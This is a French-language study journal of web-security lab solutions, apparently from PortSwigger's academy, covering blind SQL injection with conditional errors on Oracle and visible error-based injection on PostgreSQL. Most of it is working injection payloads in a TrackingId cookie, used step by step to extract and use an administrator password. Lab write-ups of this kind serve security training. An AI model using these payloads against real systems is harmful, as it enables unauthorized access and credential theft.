- [ ] Expert

## Journal des labs
### Blind SQL injection avec erreurs conditionnelles
Résumé : le cookie `TrackingId` est injectable, aucun résultat n'est renvoyé, une erreur SQL produit un message d'erreur personnalisé. La base contient une table `users` (colonnes `username`, `password`). But : retrouver le mot de passe de `administrator` et se connecter. SGBD identifié : Oracle.

#### Solution
La démarche de détection (apostrophes, `FROM dual`, table inexistante) est décrite dans "Comment détecter". Séquence de payloads utilisés (valeur d'origine `TrackingId=xyz`) :

1. Table `users` existante : `TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`. Pas d'erreur, donc la table existe. `ROWNUM = 1` évite de renvoyer plus d'une ligne, ce qui casserait la concaténation.
2. Conditions : `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'` donne une erreur ; avec `(1=2)` l'erreur disparaît. L'erreur survient donc quand la condition est vraie.
3. Utilisateur : `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`. L'erreur est reçue, `administrator` existe.
4. Longueur du mot de passe : `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`, puis `>2`, `>3`, etc. avec Burp Repeater. L'erreur disparaît à la longueur : **20 caractères**.
5. Extraction caractère par caractère avec Burp Intruder : `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`, liste simple `a` à `z` et `0` à `9`. Le code 500 repère le bon caractère ; changer l'offset (`SUBSTR(password,2,1)`, etc.) pour chaque position. Détails d'Intruder dans [[Blind-SQL-injection]].
6. Se connecter en tant que `administrator` via "My account" avec le mot de passe trouvé.

### Visible error-based SQL injection
Lab de référence de la famille verbeuse : le cookie `TrackingId` est injectable et le message d'erreur SQL est affiché. Déroulé attendu, à valider lors de la réalisation du lab (le SGBD attendu est PostgreSQL)
1. Ajouter `'` et observer l'erreur SQL affichée.
2. Tester `' AND CAST((SELECT 1) AS int)-- ` : le message indique que `AND` attend un booléen.
3. Corriger en `' AND 1=CAST((SELECT 1) AS int)-- `.
4. Remplacer `SELECT 1` par `SELECT username FROM users LIMIT 1`, puis `SELECT password FROM users WHERE username='administrator' LIMIT 1`.
5. Si le message est tronqué, supprimer la valeur d'origine du cookie.
6. Se connecter en tant que `administrator`.

## Liens
- [[SQL-injection]]
- [[Blind-SQL-injection]]
- [[SQL-injection-Union-Attacks]]
- [[Using-Burp-Suite]]
- [[Payloads-cheatsheet]]
- https://portswigger.net/web-security/sql-injection/cheat-sheet
